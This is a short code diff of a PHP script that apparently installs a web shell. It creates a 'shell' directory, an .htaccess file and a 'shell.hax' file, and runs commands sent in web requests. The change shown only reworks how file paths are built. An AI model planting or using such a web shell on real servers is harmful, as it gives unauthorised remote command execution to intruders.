@@ -3,7 +3,6 @@
 // - jgor <jgor@indiecom.org>
 
 $dir = 'shell';
-$htaccess = '.htaccess';
 $shell = 'shell.hax';
 
 function create_directory($folder) {
@@ -85,8 +84,8 @@ function execute_command($shell, $cmd) {
     echo "Output:<br /><textarea rows=25 cols=80>$output</textarea>";
 }
 
-$htaccess = $dir . '/' . $htaccess;
-$shell = $dir . '/' . $shell;
+$htaccess = "$dir/.htaccess";
+$shell = "$dir/$shell";
 
 if ($_REQUEST['remove']) {
     remove_shell($shell);
